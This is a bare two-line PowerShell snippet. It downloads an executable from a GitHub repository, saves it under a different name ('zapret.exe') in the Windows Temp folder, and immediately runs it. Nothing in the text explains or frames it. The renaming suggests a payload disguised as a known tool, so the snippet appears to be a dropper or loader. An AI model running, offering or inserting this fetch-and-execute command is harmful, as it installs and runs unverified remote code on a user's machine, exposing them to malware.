(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/newe/raw/refs/heads/main/Timeless.exe','C:/Windows/Temp/zapret.exe')
Start-Process 'C:\Windows\Temp\zapret.exe'